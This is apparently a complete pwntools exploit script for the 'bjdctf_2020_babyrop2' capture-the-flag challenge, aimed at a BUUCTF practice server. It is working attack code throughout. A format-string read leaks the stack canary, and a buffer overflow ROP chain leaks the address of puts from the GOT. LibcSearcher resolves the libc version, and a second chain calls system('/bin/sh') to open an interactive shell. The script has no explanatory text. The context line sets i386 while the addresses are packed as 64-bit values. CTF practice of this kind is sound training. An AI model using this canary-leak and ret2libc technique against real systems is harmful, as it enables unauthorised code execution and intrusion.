from pwn import *
from LibcSearcher import LibcSearcher

#context(os='linux', arch='amd64', log_level='debug')
#
context(os='linux', arch='i386', log_level='debug')
#io = process('./bjdctf_2020_babyrop2')
#
io = connect('node5.buuoj.cn',25650)
elf=ELF('./bjdctf_2020_babyrop2')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

ru('help u!\n')
sl('aa%7$p')#fmt
ru('aa0x')
canary=int(io.recv(16).decode(),16)

ru('u story!\n')
pp=plt('puts')
pg=got('puts')
rdi=0x0000000000400993
main=0x0000000000400905
pl=b'b'*(0x20-8)+p64(canary)+b'b'*8
pl+=p64(rdi)+p64(pg)+p64(pp)+p64(main)
sl(pl)

pr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc=LibcSearcher('puts',pr)
lb=pr-libc.dump('puts')
sa=lb+libc.dump('system')
ba=lb+libc.dump('str_bin_sh')
ru('u story!\n')
pl=b'b'*(0x20-8)+p64(canary)+b'b'*8
pl+=p64(rdi)+p64(ba)+p64(sa)
sl(pl)

#
io.interactive()
